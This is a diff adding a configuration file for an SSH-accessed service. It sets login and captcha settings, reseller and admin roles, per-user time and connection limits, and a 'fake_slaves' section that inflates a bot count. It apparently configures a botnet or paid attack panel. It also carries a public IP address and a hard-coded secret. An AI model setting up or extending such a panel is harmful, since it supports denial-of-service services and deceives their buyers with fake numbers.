@@ -1,0 +1,53 @@
+[ssh]
+login_timeout=30
+port=1000
+address="38.242.197.92"
+server_key="assets/ssh.ppk"
+max_auth_attempts=4
+custom_auth=false
+
+[ssh.captcha]
+enabled=true
+ignore_perms=["admin", "reseller"]
+max=20
+min=1
+
+[ssh.doxyProxy]
+enabled = false
+address = "127.0.0.1"
+port = 8080
+secret = "f123a7bb5a1d8593"
+
+[database]
+sqlite=true
+schemas="assets/schemas/"
+database="assets/slovakia.sql"
+username=""
+password=""
+host=""
+
+[branding]
+live_reload=true
+recycle_log=10
+
+[backup]
+enabled=false
+repeat_every_hours=24
+
+[fake_slaves]
+enabled=false
+maximum=15000
+minimum=3500
+sleep=100
+max_change=1000
+min_change=500
+
+[default_user]
+maxtime=120
+cooldown=120
+conns=1
+api=false
+expiry_days=30
+warns_before_kick=2
+max_sessions=1
+theme="default"
